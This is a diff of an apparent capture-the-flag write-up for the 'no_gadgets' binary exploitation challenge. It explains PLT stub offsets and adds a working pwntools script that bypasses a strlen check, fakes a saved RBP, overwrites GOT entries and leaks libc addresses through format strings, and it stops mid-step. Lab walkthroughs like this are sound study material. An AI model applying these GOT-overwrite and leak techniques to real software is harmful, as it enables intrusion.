@@ -5,9 +5,8 @@
 
 ## Lessons Learned:
 1. Bypass **strlen()** check.
-2. Exploiting GLIBC version 2.35.
-3. Perform partial GOT overwrite using controlled **RBP**.
-4. Passing **/bin/sh** strings to drop shell.
+2. Exploiting GLIBC version 2.35 gadgets limitation.
+3. Perform GOT overwrite using controlled **RBP**.
 
 ## DESCRIPTION:
 <p align="justify">In a world of mass shortages, even gadgets have gone missing. The remaining ones are protected by the gloating MEGAMIND, a once-sentient AI trapped in what remains of the NSA's nuclear bunker. Retrieving these gadgets is a top priority, but by no means easy. Much rests on what you can get done here, hacker. One could say too much.</p>
@@ -172,3 +171,110 @@ exit@got -> ?
 ![image](https://github.com/user-attachments/assets/16d3bd4d-311c-422b-9b0a-a7c97305048f)
 
 28. For the rest functions, since we don't need it, let's just fill them with their original resolver address. With this, they get resolved again and work correctly.
+29. Each PLT entry is a small chunk of assembly code (a stub) that pushes the GOT address for the unresolved function and jumps to the dynamic linker resolver.
+
+![image](https://github.com/user-attachments/assets/6c693157-10aa-4c98-9934-02a0ff785cb7)
+
+
+30. The reason `offset+6` is our interest, because our goal is to manipulate the execution flow so that it skips the indirect jump at the start of PLT entry.
+31. By jumping directly to the `+6` offset in the PLT stub, the payload avoids going through the resolver logic (which could disrupt our exploit).
+32. Instead, it executes the next part of the stub, such as direct call to the function or another useful sequence.
+
+#### NOTES FROM IMAGE ABOVE:
+
+```
+Offset +6 instruction is at the start of PLT stb, while the second instruction
+(the push to the dynamic linker) starts at 6 bytes later
+
+If we add 6 to the address of the PLT entry, we jump past the first jmp instruction
+and land directly in the middle of the PLT stub, avoiding the jump to the GOT
+and the resolver logic.
+```
+
+> EXPLOIT SCRIPT STAGE 2
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+exe = './no_gadgets'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'INFO'
+
+library = './libc.so.6'
+libc = context.binary = ELF(library, checksec=False)
+context.log_level = 'INFO'
+
+sh = process(exe)
+# sh = remote('94.237.50.242',55086)
+
+fgets_gadget = 0x40121b
+log.success(f'FGETS GADGET -> {hex(fgets_gadget)}')
+rop = ROP(elf)
+
+# [+] BYPASS STRLEN AND SET RSP TO FAKE SAVED RBP
+
+p = flat([
+    b'\x00', # bypass strlen
+    b'\x90' * 127, # pad to RBP
+    elf.got['puts']+0x80, # fake saved RBP (RSP start di puts@got)
+    rop.find_gadget(['ret']).address, # stack alignment
+    fgets_gadget # return to fgets call
+])
+
+sh.sendlineafter(b':', p)
+
+# [+] CREATE FAKE RBP
+
+'''
+pwndbg> got
+Filtering out read-only entries (display them with -r or --show-readonly)
+
+State of the GOT of /home/scorch/Downloads/htb-retired/pwn_no_gadgets/challenge/no_gadgets:
+GOT protection: Partial RELRO | Found 6 GOT entries passing the filter
+[0x404000] puts@GLIBC_2.2.5 -> 0x7ffff7c80ed0 (puts) ◂— endbr64 
+[0x404008] strlen@GLIBC_2.2.5 -> 0x401046 (strlen@plt+6) ◂— push 1
+[0x404010] printf@GLIBC_2.2.5 -> 0x7ffff7c60770 (printf) ◂— endbr64 
+[0x404018] fgets@GLIBC_2.2.5 -> 0x7ffff7c7f400 (fgets) ◂— endbr64 
+[0x404020] setvbuf@GLIBC_2.2.5 -> 0x7ffff7c81670 (setvbuf) ◂— endbr64 
+[0x404028] exit@GLIBC_2.2.5 -> 0x401086 (exit@plt+6) ◂— push 5
+pwndbg> 
+'''
+
+p = flat([
+    b'%p'*6,
+    # 0x401211,
+    0x0000000000401216, # replacing strlen@got with printf call
+    elf.plt['printf']+0x6, #printf@got
+    elf.plt['fgets']+0x6, #fgets@got
+    elf.plt['setvbuf']+0x6, #setvbuf@got
+    elf.plt['exit']+0x6  #exit@got
+])
+
+sh.sendline(p)
+
+sh.interactive()
+```
+
+33. Another things to note here that you can't add above 5 %p, because the first argument -> `%p%p%p%p` is passed in RDI and the rest are expected in:
+
+|Register|Argument|
+|:------:|:------:|
+|RDI|The format string itself|
+|RSI| First %p|
+|RDX| Second %p|
+|RCX| Third %p|
+|R8| Fourth %p|
+|R9| Fifth %p|
+
+34. Since only the first 6 arguments are passed in registers and RDI is taken by he format string, that leaves 4 %p by default. Then about `R9`, probably passed on the stack because the function call may not have stored useful addresses beyond R8.
+35. Anyway, we got a leak!
+
+> RESULT
+
+![image](https://github.com/user-attachments/assets/1eb8386b-37e0-42e1-99a8-cf7f823e6d29)
+
+36. Relocate it using vmmap libc base, shall gave us the libc base.
+37. Now
